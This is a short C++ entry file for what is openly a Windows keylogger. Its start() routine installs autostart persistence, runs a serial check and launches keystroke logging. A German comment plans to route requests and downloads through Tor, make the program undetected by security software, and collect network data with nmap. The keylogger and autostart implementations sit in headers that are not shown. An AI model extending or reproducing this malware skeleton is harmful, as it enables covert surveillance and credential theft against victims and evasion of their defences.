#include <cstdio>
#include <sstream>
#include <time.h>
#include <map>
#include <Windows.h>
#include <cstdio>
#include <iostream>
#include <sstream>
#include <time.h>
#include <stdio.h>
#include <iostream>
#include <chrono>
#include <fstream>
#include <shellapi.h>
#include "Autostart.h"
#include "SerialCheck.h"
#include "Keylogger.h"
using namespace std;

int main() {
	void start();
	start();
	return 0;
}

void start()
{

	createAutoStart();

	checkSerials();
	
	startKeyLogger();

}

/*

1) Alle Sql Requests oder Download �ber tor netzwerk leiten, Verschl�sselung SEW
2) Undetected Software
3) Netzwerkdaten: .net library f�r nmap

*/